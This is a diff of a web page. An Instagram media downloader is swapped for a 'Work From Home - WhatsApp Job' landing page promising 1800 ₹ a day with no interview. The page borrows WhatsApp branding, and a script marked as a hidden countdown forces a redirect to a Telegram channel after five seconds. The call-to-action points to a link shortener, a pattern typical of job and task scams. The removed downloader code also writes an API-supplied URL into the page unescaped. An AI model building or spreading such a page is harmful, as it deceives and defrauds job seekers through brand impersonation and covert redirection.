@@ -1,76 +1,89 @@
-<!DOCTYPE html><html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>Instagram Downloader</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background: linear-gradient(to right, #ff9966, #ff5e62);
-            color: white;
-            padding: 50px;
-        }
-        h2 {
-            margin-bottom: 20px;
-        }
-        input {
-            padding: 10px;
-            width: 300px;
-            border: none;
-            border-radius: 5px;
-        }
-        button {
-            padding: 10px 20px;
-            background: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        button:hover {
-            background: #45a049;
-        }
-        .result, .error {
-            margin-top: 20px;
-            font-weight: bold;
-        }
-        .result a {
-            color: #fff;
-            background: #008CBA;
-            padding: 10px 20px;
-            border-radius: 5px;
-            text-decoration: none;
-        }
-        .result a:hover {
-            background: #005f73;
-        }
-    </style>
-    <script>
-        async function fetchInstagramMedia() {
-            const url = document.getElementById('url').value;
-            if (!url) {
-                alert('Please enter a valid Instagram URL');
-                return;
-            }try {
-            const apiUrl = `https://api.example.com/instagram?url=${encodeURIComponent(url)}`; // Replace with a working API
-            const response = await fetch(apiUrl);
-            const data = await response.json();
-            
-            if (data && data.media_url) {
-                document.getElementById('result').innerHTML = `<a href='${data.media_url}' download>Download</a>`;
-            } else {
-                document.getElementById('result').innerHTML = `<div class='error'>Invalid URL or API issue.</div>`;
-            }
-        } catch (error) {
-            document.getElementById('result').innerHTML = `<div class='error'>Error fetching data.</div>`;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Work From Home - WhatsApp Job</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom, #00c6ff, #0072ff);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
-</script>
-
+    .card {
+      background: white;
+      border-radius: 20px;
+      padding: 30px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+    .logo {
+      font-size: 28px;
+      margin-bottom: 10px;
+      font-weight: bold;
+      color: green;
+    }
+    .heading {
+      font-size: 22px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    .highlight {
+      color: green;
+      font-weight: bold;
+    }
+    .subheading {
+      font-size: 16px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    .rate {
+      font-size: 28px;
+      font-weight: bold;
+      color: #00aaff;
+      margin-bottom: 20px;
+    }
+    .note {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 10px;
+    }
+    .btn {
+      display: inline-block;
+      background: #00aaff;
+      color: white;
+      padding: 12px 20px;
+      text-decoration: none;
+      border-radius: 8px;
+      font-weight: bold;
+      transition: background 0.3s ease;
+    }
+    .btn:hover {
+      background: #008ecc;
+    }
+  </style>
+  <script>
+    // Countdown timer (hidden)
+    setTimeout(function(){
+      window.location.href = "https://t.me/Easytaskearnig"; // Replace with your redirect link
+    }, 5000); // 5 seconds
+  </script>
 </head>
 <body>
-    <h2>Instagram Video/Image Downloader</h2>
-    <input type="text" id="url" placeholder="Instagram post URL" required>
-    <button onclick="fetchInstagramMedia()">Download</button>
-    <div id="result" class="result"></div>
+  <div class="card">
+    <div class="logo">WhatsApp</div>
+    <div class="heading">MAKE MONEY ON <span class="highlight">WHATSAPP</span></div>
+    <div class="subheading">WORK FROM HOME</div>
+    <div class="rate">1800 ₹/day</div>
+    <div class="note">IF YOU ARE INTERESTED, PLEASE</div>
+    <a href="https://hodlink.in/6badd5" class="btn">CLICK TO PARTICIPATE</a>
+    <div class="note">NO INTERVIEW</div>
+  </div>
 </body>
 </html>
